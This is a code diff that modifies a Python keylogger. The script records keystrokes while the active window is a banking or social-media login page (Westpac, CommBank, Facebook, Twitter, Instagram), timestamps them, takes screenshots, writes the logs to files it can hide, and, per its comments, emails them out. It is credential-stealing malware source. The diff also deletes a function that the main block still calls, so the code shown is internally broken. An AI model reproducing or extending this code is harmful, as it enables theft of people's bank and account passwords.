@@ -48,34 +48,44 @@ old_app = ''
 num_screenshots = 0
 now = time.time()
 login_sites = {'Sign in to Westpac Live Online Banking - Google Chrome', 'Facebook – log in or sign up - Google Chrome', 'Login on Twitter / Twitter - Google Chrome', 'Sign up for Twitter / Twitter - Google Chrome', 'Sign up • Instagram - Google Chrome', 'Instagram - Google Chrome', 'Login • Instagram - Google Chrome', 'Personal banking including accounts, credit cards and home loans - CommBank - Google Chrome'}
+website = ""
+times = []
 
 # ... Keylogger Functions... #
 
 # log keystrokes to file
 def on_press(key):
-    global old_app, message, logged_data
+    global old_app, logged_data, website, times, message
     
     # show what application is being used
     new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
     if old_app == '':
         old_app = new_app
+        website = f'Website Opened: {new_app}\n\n'
     # check when the program has been changed before writing into the log file
     # i.e. the target program was closed
-    elif new_app != old_app and old_app != '':
-        write_file(logged_data, message)
+    elif new_app != old_app:
+        write_file(logged_data, message, website)
         old_app = new_app
-
+    elif new_app == old_app:
+        website = f'Website Opened: {new_app}\n\n'
+   
     if new_app in login_sites:
+        if  len(times) == 0:
+            times.append(time.ctime(time.time()))
+        elif key =='Key.enter':
+            times.append(time.ctime(time.time()))
+        # print("{0} pressed".format(key))
         logged_data.append(key)
-
-# exit the program
-def on_release(key):
-    if key == Key.esc:
-        sys.exit()
+    
+    # print("======================") 
+    # print("new app is", new_app) 
+    # print("old app is", old_app)
+    # print("======================") 
 
 # log the keys to a file via appending mode
-def write_file(keys, message):
-    global logged_data
+def write_file(keys, message, website):
+    global logged_data, times
 
     if len(keys) == 0:
         return
@@ -86,18 +96,18 @@ def write_file(keys, message):
     while path.exists(log_dir+filename):
         filename = str(random.randint(1000000, 9999999)) + '.txt'
     
-    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
-    message += f'Website Opened: {new_app}\n\n'
-    
     # write in the log file
     with open(log_dir+filename, "a") as f:
         f.write(message)
-        f.write('[' + datetime + ']: ')
+        f.write(website)
+        f.write("\n" + '[' + times[0] + ']: ')
+        index = 1
         for key in keys:
             key = str(key)
             # remove quotation marks
             if key == 'Key.enter':
-                f.write("\n" + '[' + datetime + ']: ')
+                f.write("\n" + '[' + times[index] + ']: ')
+                index += 1
             elif key == 'Key.space':
                 f.write(" ")
             elif key.find("Key") == -1 and key.find("\\x") == -1:
@@ -114,6 +124,7 @@ def write_file(keys, message):
         # email and delete files when finished writing
         f.close()
         logged_data = []
+        times = []
     
     # make the log file hidden
     # M1: os.system( "attrib +h " + log_dir + filename)
@@ -237,6 +248,7 @@ def monitor_user_inactivity():
         time_screenshot() 
         
         getLastInputInfo = int(get_idle_duration())
+        # print(getLastInputInfo)
         
         # if the user has been idle for 9 minutes, email all the files in the
         # Logs folder. This is avoid delays which slows the computer making
@@ -262,9 +274,9 @@ def time_screenshot():
     if new_app in login_sites:
         if time.time() >= future:
             now = time.time()
-            # take a max of 5 screenshoots for each login website
-            if num_screenshots < 5:
-                # delay the first screenshot by 3 seconds
+            # take a max of 3 screenshoots for each login website
+            if num_screenshots < 3:
+                # delay the first screenshot by a second
                 if num_screenshots == 0:
                     time.sleep(1)
                 screenshot()
@@ -277,4 +289,3 @@ if __name__=='__main__':
         
 	with Listener(on_press=on_press, on_release=on_release) as listener:
 		listener.join()
-
